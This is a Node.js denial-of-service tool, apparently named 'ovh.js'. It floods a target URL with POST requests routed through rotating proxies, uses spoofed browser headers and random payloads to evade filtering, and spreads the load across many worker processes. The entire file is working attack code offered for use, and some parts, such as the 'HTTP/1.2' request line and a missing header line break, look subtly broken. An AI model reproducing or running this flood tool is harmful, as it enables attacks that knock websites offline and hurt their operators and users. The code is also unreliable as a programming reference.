const net = require('net');
const http = require('http');
const tls = require('tls');
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log('Usage: node ovh.js <target> <time> <threads> <proxy_file> <rps>');
    process.exit(0);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const proxyFile = process.argv[5];
const rps = parseInt(process.argv[6]);

const parsedTarget = url.parse(target);

let PROXYLIST = [];
if (fs.existsSync(proxyFile)) {
    PROXYLIST = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(a => a.trim() && a.includes(':'));
}

const headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 80, maxVersion: 107},
        {name: "firefox", minVersion: 70, maxVersion: 106},
        {name: "safari", minVersion: 13, maxVersion: 16},
    ],
    devices: [
        "desktop",
        "mobile"
    ],
    operatingSystems: [
        "windows",
        "linux",
        "macos",
        "android",
        "ios"
    ]
});

const randomHeaders = () => {
    const headers = headerGenerator.getHeaders();
    return {
        ...headers,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'X-Requested-With': 'XMLHttpRequest'
    };
};

const randomString = (length) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
};

const generatePayload = () => {
    return `data=${encodeURIComponent(randomString(Math.floor(Math.random() * 16) + 8))}`;
};

const flood = () => {
    if (PROXYLIST.length === 0) {
        console.log('No proxies loaded. Exiting...');
        process.exit(0);
    }

    setInterval(() => {
        const proxy = PROXYLIST[Math.floor(Math.random() * PROXYLIST.length)];
        const [proxyHost, proxyPort] = proxy.split(':');
        
        const req = http.request({
            host: proxyHost,
            port: proxyPort,
            method: 'CONNECT',
            path: parsedTarget.host + ':443'
        });

        req.on('connect', (res, socket) => {
            const tlsConnection = tls.connect({
                host: parsedTarget.host,
                servername: parsedTarget.host,
                socket: socket,
                rejectUnauthorized: false,
                secureContext: tls.createSecureContext({
                    secureProtocol: 'TLSv1_2_method'
                })
            }, () => {
                for (let i = 0; i < rps; i++) {
                    const headers = randomHeaders();
                    const payload = generatePayload();
                    const request = `POST ${parsedTarget.path || '/'} HTTP/1.2\r\n` +
                        `Host: ${parsedTarget.host}\r\n` +
                        Object.entries(headers).map(([key, value]) => `${key}: ${value}`).join('\r\n') +
                        `Content-Length: ${payload.length}\r\n` +
                        'Connection: Keep-Alive\r\n\r\n' +
                        payload;

                    tlsConnection.write(request);
                }
            });

            tlsConnection.on('error', () => {
                tlsConnection.destroy();
            });
        });

        req.on('error', () => {
            req.destroy();
        });

        req.end();
    }, 1000 / rps);
};

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, time * 1000);
} else {
    flood();
} 